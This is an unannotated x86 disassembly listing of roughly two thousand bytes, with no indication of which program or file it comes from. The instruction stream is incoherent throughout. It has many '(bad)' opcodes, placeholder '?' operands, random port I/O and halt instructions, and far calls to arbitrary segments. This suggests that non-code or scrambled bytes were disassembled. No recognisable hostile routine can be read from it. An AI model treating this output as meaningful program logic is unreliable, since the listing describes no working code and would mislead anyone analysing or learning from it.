  411e72:	dec    ebp
  411e73:	mov    ebx,DWORD PTR [ebp-0x606572f9]
  411e79:	jb     0x411ee0
  411e7b:	fcomp  QWORD PTR [ebp-0x383f1e17]
  411e81:	or     dh,BYTE PTR ds:[edx]
  411e84:	fldenv [edx+0x59]
  411e87:	push   ss
  411e88:	lock stos BYTE PTR es:[edi],al
  411e8a:	les    eax,FWORD PTR [ebx+0x51]
  411e8d:	pop    edx
  411e8e:	push   ebx
  411e8f:	out    dx,al
  411e90:	xor    cl,cl
  411e92:	inc    esi
  411e93:	mov    ecx,ebp
  411e95:	(bad)  
  411e96:	sub    eax,0xcce69446
  411e9b:	pop    es
  411e9c:	das    
  411e9d:	jg     0x411eb3
  411e9f:	div    BYTE PTR ds:0xc757309a
  411ea5:	repnz mov esp,0x11b9cc67
  411eab:	jp     0x411edf
  411ead:	sbb    esi,DWORD PTR [edx]
  411eaf:	dec    eax
  411eb0:	add    ch,BYTE PTR [edx+0x59]
  411eb3:	lds    edx,FWORD PTR [eax+0x3d]
  411eb6:	mov    ecx,0x5825d28
  411ebb:	jmp    0x411f26
  411ebd:	inc    eax
  411ebe:	xchg   BYTE PTR [esi+0x3a],bl
  411ec1:	clc    
  411ec2:	cmp    bl,BYTE PTR [ebx-0x50]
  411ec5:	popf   
  411ec6:	loopne 0x411ead
  411ec8:	push   ss
  411ec9:	hlt    
  411eca:	jo     0x411ee4
  411ecc:	mov    dl,0x45
  411ece:	inc    esi
  411ecf:	pop    esp
  411ed0:	dec    esi
  411ed1:	test   eax,0xedb06596
  411ed6:	js     0x411e5d
  411ed8:	or     edi,DWORD PTR [edx]
  411eda:	inc    eax
  411edb:	mov    WORD PTR [edx-0x5f0d01ce],es
  411ee1:	arpl   WORD PTR [edx-0x2aff1d17],si
  411ee7:	inc    eax
  411ee8:	icebp  
  411ee9:	enter  0x2a7e,0x4a
  411eed:	jmp    0x411e80
  411eef:	adc    dl,BYTE PTR [ecx-0x15]
  411ef2:	mov    ds:0x532894e3,al
  411ef7:	jle    0x411e85
  411ef9:	stos   DWORD PTR es:[edi],eax
  411efa:	pop    ds
  411efb:	mov    dh,0xa8
  411efd:	pop    ebp
  411efe:	mov    ebp,0xb856286
  411f03:	lock mov DWORD PTR cs:[edi-0x53b1bbb2],eax
  411f0b:	mov    ds:0x66168ab,eax
  411f10:	jne    0x411f3e
  411f12:	arpl   ax,bx
  411f14:	cmp    cl,BYTE PTR [ebx]
  411f16:	push   ds
  411f17:	mov    ecx,0xf7201265
  411f1c:	xor    BYTE PTR [ebx+0x711576e9],0x87
  411f23:	out    0x58,eax
  411f25:	arpl   WORD PTR [esi+0x47],sp
  411f28:	jnp    0x411eb8
  411f2a:	jne    0x411f44
  411f2c:	jmp    0x411f3a
  411f2e:	adc    al,ch
  411f30:	stos   DWORD PTR es:[edi],eax
  411f31:	mov    bl,0x40
  411f33:	pop    ebx
  411f34:	fld    st(3)
  411f36:	leave  
  411f37:	add    al,0x1c
  411f39:	xchg   edx,eax
  411f3a:	scas   eax,DWORD PTR es:[edi]
  411f3b:	sub    eax,0x63b05b83
  411f40:	pop    esp
  411f41:	in     al,dx
  411f42:	mov    ah,0xaf
  411f44:	int    0x4a
  411f46:	in     eax,0x60
  411f48:	mov    ebp,0xf9a34ac5
  411f4d:	and    esp,DWORD PTR [ebx]
  411f4f:	out    dx,eax
  411f50:	popa   
  411f51:	inc    eax
  411f52:	mov    esp,0x23a0770
  411f57:	mov    ds:0x43cf4f8,al
  411f5c:	shl    cl,1
  411f5e:	jge    0x411f8f
  411f60:	jmp    0x5e4d8847
  411f65:	mov    ds:0x6b62f526,al
  411f6a:	sub    BYTE PTR [edi+0x2b],0x2f
  411f6e:	or     bh,BYTE PTR [ebx+0x3d652f7a]
  411f74:	adc    ebx,DWORD PTR [ebx-0x4bc6d0e9]
  411f7a:	aad    0x8b
  411f7c:	push   esp
  411f7d:	mov    edx,0x6adeda17
  411f82:	es inc ecx
  411f84:	push   es
  411f85:	ins    DWORD PTR es:[edi],dx
  411f86:	xchg   esi,eax
  411f87:	(bad)  
  411f88:	lods   al,BYTE PTR ds:[esi]
  411f89:	div    DWORD PTR [edx+ebx*2]
  411f8c:	je     0x411f54
  411f8e:	jl     0x411f3f
  411f90:	icebp  
  411f91:	lods   eax,DWORD PTR ds:[esi]
  411f92:	mov    ecx,0x3088937b
  411f97:	mov    esi,0xcc63fc24
  411f9c:	jno    0x411f8e
  411f9e:	call   0x82cb:0x1352006c
  411fa5:	mov    eax,ds:0xbf235120
  411faa:	(bad)  
  411fab:	push   ebx
  411fac:	(bad)  
  411fad:	mov    ds:0xc9a5e042,eax
  411fb2:	popa   
  411fb3:	xor    edx,DWORD PTR [esi-0x1e]
  411fb6:	mov    edi,0x9842fe12
  411fbb:	xor    eax,0xf4aa807a
  411fc1:	mov    bh,0x26
  411fc3:	mov    ch,0x5d
  411fc5:	lods   eax,DWORD PTR ds:[esi]
  411fc6:	shr    esp,cl
  411fc8:	clc    
  411fc9:	ins    DWORD PTR es:[edi],dx
  411fca:	ret    0x145f
  411fcd:	jns    0x411f8f
  411fcf:	stos   BYTE PTR es:[edi],al
  411fd0:	cs (bad) 
  411fd3:	ins    DWORD PTR es:[edi],dx
  411fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fd5:	aas    
  411fd6:	popf   
  411fd7:	jns    0x41200c
  411fd9:	or     eax,DWORD PTR [esi+0x59fc9200]
  411fdf:	or     al,0xfb
  411fe1:	sub    dl,BYTE PTR [esi+ebx*2-0x7ec1c04e]
  411fe8:	popf   
  411fe9:	daa    
  411fea:	sub    edi,esi
  411fec:	adc    DWORD PTR [ebx],eax
  411fee:	(bad)  [eax+0x77]
  411ff1:	das    
  411ff2:	pop    esp
  411ff3:	retf   0xaa8a
  411ff6:	adc    ebp,DWORD PTR [ecx+eiz*4]
  411ff9:	xchg   ecx,eax
  411ffa:	lock retf 
  411ffc:	icebp  
  411ffd:	daa    
  411ffe:	dec    ecx
  411fff:	scas   eax,DWORD PTR es:[edi]
  412000:	sub    eax,0x4d313450
  412005:	(bad)  
  412006:	mov    esi,DWORD PTR [edi+0x50b97816]
  41200c:	cwde   
  41200d:	sbb    eax,0xe281cf33
  412012:	or     DWORD PTR [eax],ecx
  412014:	push   es
  412015:	sbb    BYTE PTR ds:0xa524f3b,bh
  41201b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41201c:	sub    eax,edx
  41201e:	jmp    0x411fe5
  412020:	inc    eax
  412021:	cmp    DWORD PTR [edx-0x59b793e8],edx
  412027:	pop    esi
  412028:	mov    edx,0x377dd1ed
  41202d:	mul    DWORD PTR [edi+edx*4+0x66]
  412031:	jecxz  0x411fd9
  412033:	mov    ah,0x54
  412035:	inc    ecx
  412036:	nop
  412037:	adc    al,0xb0
  412039:	test   al,0x8
  41203b:	sar    ah,cl
  41203d:	mov    ?,WORD PTR [edx]
  41203f:	mov    esi,0xecb23714
  412044:	mov    eax,0x5318400b
  412049:	scas   eax,DWORD PTR es:[edi]
  41204a:	sub    cl,BYTE PTR [ebx+0x11]
  41204d:	mov    ebp,0x8f0b8621
  412052:	mov    eax,ds:0x5d5cce69
  412057:	stc    
  412058:	adc    edx,DWORD PTR [edi-0x660c9b81]
  41205e:	dec    ebp
  41205f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412060:	or     DWORD PTR [ebx],0x51a12b48
  412066:	les    edi,FWORD PTR [edi+0x3aeb73ed]
  41206c:	clc    
  41206d:	xlat   BYTE PTR ds:[ebx]
  41206e:	add    al,0x45
  412070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412071:	mov    ch,0xfc
  412073:	push   esp
  412074:	pop    ebp
  412075:	mov    dl,0xc4
  412077:	push   cs
  412078:	ror    BYTE PTR [eax-0x3f],0x15
  41207c:	and    al,BYTE PTR [ebx+0x64]
  41207f:	cwde   
  412080:	jo     0x4120c5
  412082:	(bad)  
  412083:	not    eax
  412085:	xlat   BYTE PTR ds:[ebx]
  412086:	or     eax,0x9f8220c1
  41208b:	rcl    BYTE PTR [ecx-0x555915d8],0x6e
  412092:	cmp    esi,edi
  412094:	cwde   
  412095:	jbe    0x4120ff
  412097:	push   0x1e7a8959
  41209c:	bound  ebp,QWORD PTR [ebx-0x240c08e4]
  4120a2:	pop    ebp
  4120a3:	pop    ds
  4120a4:	jmp    0xc9d:0xaaa72b0f
  4120ab:	inc    edx
  4120ac:	jge    0x412039
  4120ae:	mov    esi,0x63805f84
  4120b3:	sbb    al,BYTE PTR [ebx-0x10]
  4120b6:	push   ebp
  4120b7:	js     0x4120d6
  4120b9:	push   ebp
  4120ba:	sub    eax,0x6d0a18e3
  4120bf:	ins    DWORD PTR es:[edi],dx
  4120c0:	xlat   BYTE PTR ds:[ebx]
  4120c1:	pop    esi
  4120c2:	pop    ebp
  4120c3:	fist   DWORD PTR [edx]
  4120c5:	ficom  WORD PTR [edx-0x3de62010]
  4120cb:	gs pop edi
  4120cd:	cmc    
  4120ce:	ret    0x80f0
  4120d1:	sbb    al,0xd8
  4120d3:	pusha  
  4120d4:	inc    ecx
  4120d5:	data16 (bad) 
  4120d8:	pop    ebp
  4120d9:	bound  eax,QWORD PTR [esp+eax*8]
  4120dc:	push   ebx
  4120dd:	test   eax,0xe47e2455
  4120e2:	pop    edx
  4120e3:	sbb    BYTE PTR [esi+0x1c],dh
  4120e6:	adc    BYTE PTR [esi-0x31],ch
  4120e9:	test   edi,esi
  4120eb:	call   0x92d4:0x319c32f6
  4120f2:	not    DWORD PTR [ebp+0x2b]
  4120f5:	sahf   
  4120f6:	and    eax,0x2c59c0b3
  4120fb:	stc    
  4120fc:	push   0x6f
  4120fe:	and    dh,dl
  412100:	mov    al,ds:0xeea2e2eb
  412105:	ret    0xe725
  412108:	pop    esi
  412109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41210a:	mov    al,0xa1
  41210c:	and    ah,ah
  41210e:	sub    al,0x6a
  412110:	and    cl,al
  412112:	paddsw mm7,QWORD PTR ds:[edi*2+0x5bfd80c4]
  41211b:	cmp    eax,0xba0a0ebe
  412120:	cmp    dl,BYTE PTR [esi-0x7]
  412123:	fcmovnbe st,st(0)
  412125:	(bad)  
  412126:	fadd   QWORD PTR [esi+0x25]
  412129:	(bad)  
  41212b:	xor    ch,BYTE PTR [esi+0x6a7414de]
  412131:	data16 (bad) 
  412133:	lods   al,BYTE PTR ds:[esi]
  412134:	xchg   esi,eax
  412135:	(bad)  
  412136:	and    BYTE PTR [edi],ch
  412138:	test   eax,0xc4d0387b
  41213d:	inc    ebx
  41213e:	pop    edx
  41213f:	dec    ecx
  412140:	xchg   ebx,esi
  412142:	mov    eax,0x93070279
  412147:	sub    ebp,0xe09951cc
  41214d:	loope  0x4120fe
  41214f:	aaa    
  412150:	mov    bh,0x61
  412152:	dec    cl
  412154:	xchg   edx,eax
  412155:	jl     0x412121
  412157:	loop   0x4121d2
  412159:	push   ebx
  41215a:	arpl   WORD PTR [edx-0x6e],dx
  41215d:	aas    
  41215e:	pop    ecx
  41215f:	pop    edx
  412160:	mov    dl,dh
  412162:	inc    esi
  412163:	(bad)  
  412164:	adc    DWORD PTR [ebp+edx*8-0x4b15423],ebx
  41216b:	test   ch,ah
  41216d:	cmp    BYTE PTR ds:0x60afd2d6,0xaf
  412174:	pop    eax
  412175:	mov    WORD PTR [ebx],es
  412177:	popf   
  412178:	inc    ecx
  412179:	jl     0x4121a4
  41217b:	fs push edx
  41217d:	add    edi,DWORD PTR [ebx-0x6d]
  412180:	jno    0x412152
  412182:	jne    0x4121ca
  412184:	(bad)  
  412185:	sbb    eax,0x8fb0c9ff
  41218a:	and    edx,DWORD PTR [ebx]
  41218c:	adc    al,0x7c
  41218e:	sub    al,0x3c
  412190:	jecxz  0x41211a
  412192:	mov    ah,0x88
  412194:	test   al,0xdd
  412196:	movhps xmm1,QWORD PTR [ebx]
  412199:	xor    bl,0x66
  41219c:	mov    dh,0xdf
  41219e:	iret   
  41219f:	push   edx
  4121a0:	(bad)  
  4121a2:	in     al,dx
  4121a3:	mov    al,ds:0xd68e6d9
  4121a8:	dec    edx
  4121a9:	mov    eax,0x2ba97ed9
  4121ae:	pop    edi
  4121af:	(bad)  
  4121b0:	in     eax,dx
  4121b1:	mov    eax,ds:0x29d90f7a
  4121b6:	sub    edx,DWORD PTR [eax+0x5f8f0ce7]
  4121bc:	xchg   edx,eax
  4121bd:	popf   
  4121be:	popa   
  4121bf:	mov    edi,0xcbd5a683
  4121c4:	mov    ebp,0xf49703fd
  4121c9:	(bad)  
  4121ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121cb:	xor    dl,dh
  4121cd:	xchg   edi,eax
  4121ce:	sub    dl,al
  4121d0:	jno    0x41220e
  4121d2:	jecxz  0x412193
  4121d4:	mov    ch,0x8c
  4121d6:	dec    ebx
  4121d7:	jl     0x4121d6
  4121d9:	push   ebp
  4121da:	mov    ds:0x68c1e84d,eax
  4121df:	mov    ch,0x68
  4121e1:	mov    cl,0xe5
  4121e3:	sbb    eax,DWORD PTR [edi+0x5d8fe0f0]
  4121e9:	xlat   BYTE PTR ds:[ebx]
  4121ea:	jmp    0x86e83ad8
  4121ef:	cwde   
  4121f0:	jle    0x4121b7
  4121f2:	or     DWORD PTR ds:[edi+ebx*1+0x7d],0x92ad5325
  4121fb:	mov    eax,0xc3c3e4b6
  412200:	mov    edi,0x650b4217
  412205:	arpl   cx,ax
  412207:	or     dl,bh
  412209:	mov    ah,0xaa
  41220b:	push   ebx
  41220c:	dec    esi
  41220d:	cwde   
  41220e:	rcr    BYTE PTR [ebp-0x7a],0x28
  412212:	pop    ss
  412213:	sub    eax,0x7a479851
  412218:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41221a:	fcmovnb st,st(3)
  41221c:	inc    ebx
  41221d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41221e:	(bad)  
  41221f:	call   0x3da7:0x2678ac54
  412226:	nop
  412227:	lds    edi,FWORD PTR [edi+0x30a80cbe]
  41222d:	pop    ebx
  41222e:	rcr    BYTE PTR [ebx-0x7a1b71ea],1
  412234:	inc    edi
  412235:	jnp    0x412212
  412237:	aas    
  412238:	test   al,0x3
  41223a:	or     edi,DWORD PTR [ecx]
  41223c:	jns    0x412255
  41223e:	inc    eax
  41223f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412240:	clc    
  412241:	mov    WORD PTR [ebx],ss
  412243:	dec    edi
  412244:	popa   
  412245:	push   edx
  412246:	mov    al,ds:0xa152f8
  41224b:	pop    ebx
  41224c:	sub    ecx,DWORD PTR [esi+0x1a]
  41224f:	ins    DWORD PTR es:[edi],dx
  412250:	test   BYTE PTR [esi],dl
  412252:	push   esp
  412253:	pop    ebp
  412254:	sub    eax,0x82427d2d
  412259:	mov    esp,0x6baa2b74
  41225e:	mov    ecx,0x9956b706
  412263:	pop    esi
  412264:	push   ss
  412265:	cld    
  412266:	(bad)  
  412267:	mov    bh,BYTE PTR [ebx-0x577f582f]
  41226d:	test   al,0xa
  41226f:	push   esi
  412270:	loop   0x4122ec
  412272:	je     0x4122c8
  412274:	mov    edi,0xfd515521
  412279:	sub    DWORD PTR [edi-0x6],eax
  41227c:	xchg   al,al
  41227e:	mov    bh,0x83
  412280:	rcr    al,cl
  412282:	adc    dh,BYTE PTR [eax+0x1b]
  412285:	cmp    ebx,DWORD PTR [eax-0x46]
  412288:	(bad)  
  412289:	mov    edi,0x910c0a9
  41228e:	enter  0xe30b,0xfc
  412292:	mov    cl,BYTE PTR [edx]
  412294:	fist   WORD PTR [esi+ebp*8-0x20435c20]
  41229b:	push   ebx
  41229c:	ss sti 
  41229e:	jmp    0x81c492c8
  4122a3:	shr    BYTE PTR [ecx-0x125820a2],0xc6
  4122aa:	inc    ebx
  4122ab:	and    BYTE PTR [eax+0x60],cl
  4122ae:	sub    DWORD PTR [ecx],ebp
  4122b0:	loop   0x41231b
  4122b2:	aad    0x1f
  4122b4:	adc    cl,bh
  4122b6:	push   esi
  4122b7:	mov    BYTE PTR [edi],cl
  4122b9:	scas   al,BYTE PTR es:[edi]
  4122ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122bb:	dec    edi
  4122bc:	mov    BYTE PTR [ebx+0x777d9d5e],0x18
  4122c3:	push   esp
  4122c4:	mov    ah,0x58
  4122c6:	js     0x412290
  4122c8:	jecxz  0x412286
  4122ca:	mov    edx,0xb8c6f4d1
  4122cf:	cmp    al,bh
  4122d1:	rol    esp,cl
  4122d3:	mov    edi,0x1a1defae
  4122d8:	call   0xc1dd:0x96620259
  4122df:	sbb    al,0x2b
  4122e1:	jns    0x412289
  4122e3:	and    eax,0x14a0b701
  4122e8:	fisub  WORD PTR [ebp-0x35032d24]
  4122ee:	sub    DWORD PTR [ebp-0x4e],edi
  4122f1:	adc    al,0xe7
  4122f3:	jecxz  0x4122fc
  4122f5:	enter  0xf08d,0x2e
  4122f9:	dec    edi
  4122fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122fb:	int3   
  4122fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122fd:	mov    esi,0xdd08f5a2
  412302:	sar    BYTE PTR [esi],1
  412304:	bound  ecx,QWORD PTR [ecx]
  412306:	jns    0x41228e
  412308:	into   
  412309:	jl     0x41237f
  41230b:	and    al,0x6e
  41230d:	mov    esp,0xa23c69d8
  412312:	inc    edi
  412313:	and    eax,0x62b3ae41
  412318:	retf   
  412319:	xchg   BYTE PTR [ebp-0x7f566a73],ah
  41231f:	rol    DWORD PTR [edi-0x38],cl
  412322:	retf   0x19b1
  412325:	ficom  DWORD PTR [ebx]
  412327:	fld    QWORD PTR [esi-0x1dd935d7]
  41232d:	mov    al,0xd4
  41232f:	popf   
  412330:	sbb    dh,dh
  412332:	fisub  DWORD PTR [eax]
  412334:	mov    ch,0x98
  412336:	enter  0xce6,0x5a
  41233a:	fwait
  41233b:	jge    0x4122f3
  41233d:	xor    DWORD PTR [ecx+eiz*8+0x48accb70],esi
  412344:	or     eax,0x55c1ad39
  412349:	jbe    0x412314
  41234b:	sub    cl,BYTE PTR [ebx+0x31]
  41234e:	push   esi
  41234f:	test   DWORD PTR ds:0xdc9308a8,ebp
  412355:	cmc    
  412356:	and    al,0xf3
  412358:	shl    cl,0xf9
  41235b:	sbb    eax,DWORD PTR cs:[ebx+0x7b22b439]
  412362:	ins    DWORD PTR es:[edi],dx
  412363:	loope  0x412392
  412365:	adc    BYTE PTR [esi],dh
  412367:	sbb    eax,0xdeeb4a65
  41236c:	jns    0x412392
  41236e:	push   esi
  41236f:	mov    WORD PTR [ecx+ecx*1],ds
  412372:	xchg   ebp,eax
  412373:	inc    edi
  412374:	adc    ch,dh
  412376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412377:	(bad)  
  412379:	mov    al,0xa8
  41237b:	mul    BYTE PTR [ecx]
  41237d:	scas   al,BYTE PTR es:[edi]
  41237e:	ins    BYTE PTR es:[edi],dx
  41237f:	or     al,0xa4
  412381:	jns    0x412346
  412383:	xor    bl,BYTE PTR fs:[ebx+0x15ffc7c5]
  41238a:	mov    ch,0xbe
  41238c:	in     eax,dx
  41238d:	pushf  
  41238e:	ss sbb ch,cl
  412391:	sub    al,0xb2
  412393:	mov    esp,gs
  412395:	neg    DWORD PTR [ecx-0x1f271af0]
  41239b:	add    eax,0xfa0d2343
  4123a0:	in     al,0xee
  4123a2:	inc    edx
  4123a3:	data16 hlt 
  4123a5:	int3   
  4123a6:	push   edx
  4123a7:	adc    BYTE PTR [ecx-0x41112d84],0x65
  4123ae:	xchg   esp,eax
  4123af:	sub    DWORD PTR [eax],esi
  4123b1:	pop    eax
  4123b2:	push   ecx
  4123b3:	fadd   QWORD PTR [esi+esi*1+0x202f96bb]
  4123ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123bb:	es add eax,0x9cb4b7e4
  4123c1:	je     0x412431
  4123c3:	sbb    ecx,DWORD PTR [esi]
  4123c5:	push   ebx
  4123c6:	push   eax
  4123c7:	mov    esp,0xf5fda378
  4123cc:	or     ecx,DWORD PTR [eax-0x224e6f1c]
  4123d2:	sub    ah,bl
  4123d4:	out    dx,eax
  4123d5:	mov    ?,WORD PTR [ecx]
  4123d7:	cli    
  4123d8:	(bad)  
  4123d9:	sub    al,0x93
  4123db:	dec    esp
  4123dc:	lods   al,BYTE PTR ds:[esi]
  4123dd:	fwait
  4123de:	icebp  
  4123df:	mov    dl,BYTE PTR [ebx]
  4123e1:	shl    DWORD PTR [esi],cl
  4123e3:	in     eax,0xda
  4123e5:	mov    cl,0xd1
  4123e7:	pop    ds
  4123e8:	out    0x12,al
  4123ea:	mov    edi,0xd93c9e98
  4123ef:	fistp  DWORD PTR [ecx]
  4123f1:	cs enter 0xc8f9,0x0
  4123f6:	mov    dl,0xd7
  4123f8:	std    
  4123f9:	adc    al,0x75
  4123fb:	es inc ecx
  4123fd:	adc    dh,cl
  4123ff:	call   0x8a2c766f
  412404:	push   eax
  412405:	xchg   DWORD PTR [esi],ebp
  412407:	int3   
  412408:	mov    eax,DWORD PTR [ebx+0x6310485f]
  41240e:	ror    DWORD PTR [ebp+0x409671c3],1
  412414:	xor    al,0x71
  412416:	aad    0xfe
  412418:	ins    DWORD PTR es:[edi],dx
  412419:	cmc    
  41241a:	inc    edi
  41241b:	and    DWORD PTR [eax+0x101f0abd],ecx
  412421:	sti    
  412422:	sbb    eax,0xcf2d71c0
  412427:	pop    ss
  412428:	mov    ebx,DWORD PTR [esi+edi*4-0x3aba2858]
  41242f:	dec    ecx
  412430:	sub    eax,0xf35d028d
  412435:	or     BYTE PTR [esi-0x2b45f086],0x53
  41243c:	(bad)  
  41243d:	scas   eax,DWORD PTR es:[edi]
  41243e:	cdq    
  41243f:	cmp    edi,ebx
  412441:	mov    ch,0xb5
  412443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412444:	int3   
  412445:	xchg   ebx,eax
  412446:	pop    ss
  412447:	sbb    bh,BYTE PTR [eax]
  412449:	cmp    eax,0x812b22
  41244e:	ror    BYTE PTR ds:0x925ad2a,1
  412455:	in     al,0x40
  412457:	pop    ebx
  412458:	inc    eax
  412459:	icebp  
  41245a:	mov    ebx,ebp
  41245c:	nop
  41245d:	pop    eax
  41245e:	ret    0x5887
  412461:	int3   
  412462:	aas    
  412463:	ins    DWORD PTR es:[edi],dx
  412464:	adc    BYTE PTR [ecx+ecx*1-0x5833640d],dh
  41246b:	mov    ebp,DWORD PTR [eax-0x3]
  41246e:	retf   
  41246f:	adc    BYTE PTR [ebp+0x3a],cl
  412472:	xchg   esi,eax
  412473:	mov    ecx,DWORD PTR [ecx-0x63]
  412476:	push   ebp
  412477:	in     eax,0xf8
  412479:	jno    0x412402
  41247b:	mov    ds:0xa05775eb,eax
  412480:	cwde   
  412481:	shl    DWORD PTR [eax],cl
  412483:	out    dx,al
  412484:	pop    ss
  412485:	push   esp
  412486:	popf   
  412487:	cld    
  412488:	out    0x5d,al
  41248a:	dec    esp
  41248b:	push   0x67
  41248d:	icebp  
  41248e:	scas   eax,DWORD PTR es:[edi]
  41248f:	or     esp,DWORD PTR [ebx+0x4204c6c8]
  412495:	add    ebp,edx
  412497:	shl    dh,cl
  412499:	into   
  41249a:	adc    DWORD PTR [eax],esp
  41249c:	scas   al,BYTE PTR es:[edi]
  41249d:	add    cl,bl
  41249f:	push   esi
  4124a0:	mov    ebp,0x5260ab43
  4124a5:	jns    0x412433
  4124a7:	add    BYTE PTR [edi-0x10],dl
  4124aa:	pop    edx
  4124ab:	push   eax
  4124ac:	cmp    eax,0xfe5958ec
  4124b1:	sbb    eax,0xdb914ca5
  4124b6:	pop    ebp
  4124b7:	pop    eax
  4124b8:	jge    0x412476
  4124ba:	cli    
  4124bb:	aad    0x6a
  4124bd:	pusha  
  4124be:	inc    ebp
  4124bf:	mov    ebx,DWORD PTR cs:0x20a4ff64
  4124c6:	mov    al,0x15
  4124c8:	push   es
  4124c9:	loopne 0x41248b
  4124cb:	adc    ah,BYTE PTR [edx-0x575358d9]
  4124d1:	xchg   eax,ebp
  4124d3:	dec    edi
  4124d4:	cli    
  4124d5:	and    DWORD PTR [esi-0x42],0xdc4c0b27
  4124dc:	hlt    
  4124dd:	lods   al,BYTE PTR ds:[esi]
  4124de:	add    ebx,ebp
  4124e0:	mov    BYTE PTR [edi+0x187a5094],dh
  4124e6:	jecxz  0x412555
  4124e8:	aad    0x56
  4124ea:	add    al,0x9d
  4124ec:	fidiv  DWORD PTR [edx]
  4124ee:	call   0xc0ecf57b
  4124f3:	or     al,0x2c
  4124f5:	pop    ebx
  4124f6:	jmp    0x4124ba
  4124f8:	ror    DWORD PTR [eax-0x170a4768],1
  4124fe:	inc    ecx
  4124ff:	push   ebp
  412500:	cli    
  412501:	shl    DWORD PTR [ebp+0x62d84b30],1
  412507:	into   
  412508:	hlt    
  412509:	sub    al,dl
  41250b:	jb     0x4124f7
  41250d:	dec    edi
  41250e:	mov    edx,DWORD PTR [ebx+0x63]
  412511:	repz xlat BYTE PTR ds:[ebx]
  412513:	mov    DWORD PTR [esi],ecx
  412515:	mov    bh,0x73
  412517:	into   
  412518:	rcl    DWORD PTR [ebx-0x26581eb1],1
  41251e:	orps   xmm7,xmm7
  412521:	(bad)  
  412523:	test   DWORD PTR [edi+0x63],ebx
  412526:	cli    
  412527:	jnp    0x412500
  412529:	(bad)  
  41252a:	jno    0x412599
  41252c:	xchg   DWORD PTR ds:0x32c75693,eax
  412532:	mov    dl,0xea
  412534:	iret   
  412535:	dec    edx
  412536:	mov    WORD PTR [esi-0x51],si
  41253a:	xchg   ecx,eax
  41253b:	sahf   
  41253c:	stos   DWORD PTR es:[edi],eax
  41253d:	jp     0x41258d
  41253f:	add    ebx,ebx
  412541:	sti    
  412542:	push   0x2e
  412544:	stos   DWORD PTR es:[edi],eax
  412545:	dec    edi
  412546:	int    0xf4
  412548:	neg    DWORD PTR [ecx+0x5f]
  41254b:	loop   0x412510
  41254d:	push   ecx
  41254e:	inc    esp
  41254f:	cmp    DWORD PTR [edi-0x51],ebx
  412552:	imul   edi,eax,0x67
  412555:	je     0x4124f4
  412557:	cmp    ah,ch
  412559:	jae    0x412533
  41255b:	fld    TBYTE PTR ds:0xd089a365
  412561:	xchg   edi,eax
  412562:	mov    WORD PTR [eax-0x6a],?
  412565:	xchg   esi,eax
  412566:	popa   
  412567:	mov    esi,0x5b4919e9
  41256c:	ins    DWORD PTR es:[edi],dx
  41256d:	out    0x74,al
  41256f:	pop    edi
  412570:	add    ebx,esp
  412572:	xor    ebx,DWORD PTR [edx+0x6]
  412575:	mov    ds:0x7f555f67,eax
  41257a:	inc    BYTE PTR es:[eax]
  41257d:	mov    esi,0xa2255c89
  412582:	and    BYTE PTR [edi+ecx*4+0x6d74f473],bl
  412589:	stc    
  41258a:	jo     0x41252e
  41258c:	dec    esi
  41258d:	mov    ds:0x6b1a488f,eax
  412592:	xchg   DWORD PTR [eax],edx
  412594:	out    dx,eax
  412595:	inc    ebp
  412596:	push   cs
  412597:	cmp    ch,BYTE PTR [esi]
  412599:	or     BYTE PTR [ecx+eax*8],0xa7
  41259d:	mov    ch,0xd3
  41259f:	sbb    DWORD PTR [ecx-0x76143df9],eax
  4125a5:	fs and eax,0x708ab2e4
  4125ab:	sub    ecx,ecx
  4125ad:	gs mov cl,0x76
  4125b0:	mov    esp,0xbd51fde8
  4125b5:	sub    al,0x1a
  4125b7:	iret   
  4125b8:	sub    edi,ebx
  4125ba:	out    0xf0,al
  4125bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125bd:	jno    0x412624
  4125bf:	dec    ebp
  4125c0:	push   esp
  4125c1:	sbb    dh,BYTE PTR [edx-0xd]
  4125c4:	adc    eax,0xd9765c1a
  4125c9:	pusha  
  4125ca:	add    DWORD PTR [ecx+0x54],0xd4afe059
  4125d1:	cmp    DWORD PTR [eax+0x58],esi
  4125d4:	jne    0x412600
  4125d6:	cmp    eax,0x1acfb495
  4125db:	push   eax
  4125dc:	mov    al,0x7e
  4125de:	sar    BYTE PTR [ecx+0x79],0x59
  4125e2:	sub    cl,BYTE PTR [ebx+0x4b00a902]
  4125e8:	nop/reserved BYTE PTR [ebx]
  4125eb:	and    al,0x13
  4125ed:	je     0x412613
  4125ef:	repz mov eax,ds:0xad09db29
  4125f5:	mov    al,0xdd
  4125f7:	aas    
  4125f8:	or     ah,BYTE PTR [eax+0x6eeda6fc]
  4125fe:	outs   dx,DWORD PTR ds:[esi]
  4125ff:	int3   
  412600:	fsub   QWORD PTR [ebx-0x1]
  412603:	mov    eax,ds:0x3d20fb51
  412608:	mov    esp,0x394c4ac8
  41260d:	scas   al,BYTE PTR es:[edi]
  41260e:	aam    0x1c
  412610:	ins    DWORD PTR es:[edi],dx
  412611:	mov    dl,0xbf
  412613:	call   0x31a0:0xb7170c74
  41261a:	(bad)  
  41261c:	imul   eax,DWORD PTR [edx+0x43],0xab11dbcc
  412623:	mov    dl,bh
  412625:	loope  0x41269f
  412627:	sub    DWORD PTR [edi-0x26e487cf],edi
  41262d:	jae    0x412632
  41262f:	bound  eax,QWORD PTR [edi-0x3d]
  412632:	jge    0x412682
  412634:	pop    ss
  412635:	es inc ecx
  412637:	inc    ebp
  412638:	push   eax
  412639:	cmp    al,BYTE PTR [esi+0x4f0f5d03]
  41263f:	test   al,0xb9
  412641:	in     al,0xb9
  412643:	mov    sp,0xb4a4
  412647:	mul    DWORD PTR [edi-0x5058f8d0]
  41264d:	aam    0xa4
